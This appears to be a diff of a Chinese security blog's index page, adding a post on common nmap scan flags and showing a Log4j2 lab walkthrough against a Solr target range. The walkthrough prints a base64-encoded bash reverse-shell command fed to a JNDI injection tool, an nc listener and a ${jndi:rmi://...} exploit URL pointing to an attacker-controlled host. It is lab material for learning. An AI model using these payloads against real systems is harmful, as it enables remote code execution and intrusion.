@@ -152,6 +152,96 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-nmap" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/08/02/nmap/">nmap常用命令</a>
+    </h1>
+  
+
+        
+        <a href="/2022/08/02/nmap/" class="archive-article-date">
+  	<time datetime="2022-08-02T05:01:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-08-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>常用命令参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-sP				ping扫描(不进行端口扫描)</span><br><span class="line">-sT				进行TCP全连接扫描(准确，速度慢，不安全)</span><br><span class="line">-sS				syn半连接扫描(不准确，速度快，安全)</span><br><span class="line">-Pn				绕过ping扫描</span><br><span class="line">-p port				对指定端口进行扫描</span><br><span class="line">-T1~6				设置扫描速度</span><br><span class="line">-sV				对端口上的服务程序版本进行扫描</span><br><span class="line">-O				对目标操作系统进行扫描</span><br><span class="line">-sC				使用默认脚本进行扫描</span><br><span class="line">-A				全面扫描(耗时长)</span><br><span class="line">-oN				将扫描结果保存为一个txt文件</span><br><span class="line">-oX				将扫描结果保存为一个xml文件</span><br></pre></td></tr></table></figure>
+<p>常用命令：</p>
+<p>1、存活主机扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.136.0/24</span><br></pre></td></tr></table></figure>
+<p>2、使用TCP全连接扫描目标端口及服务版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -p- 192.168.136.222</span><br></pre></td></tr></table></figure>
+<p>3、全面扫描，并将结果保存到当前目录下的test.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.136.222 -oN ./test.txt</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">目录</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">namp</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">端口扫描</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/08/02/nmap/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-log4j2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -175,30 +265,19 @@
         <p>Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。</p>
 <p>1、开启靶场</p>
 <img src="/2022/07/29/log4j2/image-20220729130204051.png" class title="image-20220729130204051">
-
-
-
 <p>2、访问测试，靶机ip:8983</p>
 <img src="/2022/07/29/log4j2/image-20220729130404970.png" class title="image-20220729130404970">
-
-
-
 <p>3、测试反弹shell</p>
 <p>​	1.使用JNDI注入工具</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNi4xNTcvMjIyMjIgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 192.168.136.157</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>-C 后面是执行的命令，-A 是监听的ip</p>
 <img src="/2022/07/29/log4j2/image-20220729132016537.png" class title="image-20220729132016537">
-
 <p>​	2.攻击机开启监听</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 22222</span><br></pre></td></tr></table></figure>
-
 <p>​	3.使用工具生成的语句构建url</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8983/solr/admin/cores?action=$&#123;jndi:rmi://192.168.136.157:1099/hrd2kj&#125;</span><br></pre></td></tr></table></figure>
-
 <p>​	4.访问进行攻击</p>
 <img src="/2022/07/29/log4j2/image-20220729132748694.png" class title="image-20220729132748694">
-
 <p>​	5.攻击机已接收到反弹shell</p>
 <img src="/2022/07/29/log4j2/image-20220729133008560.png" class title="image-20220729133008560">
 
@@ -219,6 +298,10 @@
       		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">log4j</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">漏洞</a>
         		</li>
       		
 		</ul>
@@ -355,7 +438,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">namp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">端口扫描</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">log4j</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">漏洞</a>
               </li>
             
             <div class="clearfix"></div>
